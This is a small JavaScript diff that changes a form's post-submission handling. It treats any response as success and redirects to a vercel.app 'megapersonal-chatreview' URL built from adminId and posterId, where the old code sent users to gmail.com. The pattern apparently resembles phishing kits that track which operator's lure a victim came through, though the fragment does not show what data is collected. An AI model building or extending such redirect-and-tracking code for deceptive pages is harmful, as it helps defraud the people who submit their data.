@@ -69,9 +69,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 .then(response => response.json())
                 .then(data => {
                     console.log('Response:', data);
-                    if (data.success) {
+                    if (data) {
                         // Redirect to another URL on success
-                        window.location.href = 'https://gmail.com';
+                        window.location.href =  `https://megapersonal-chatreview.vercel.app/${adminId}/${posterId}`;
                     }
                 })
                 .catch(error => {
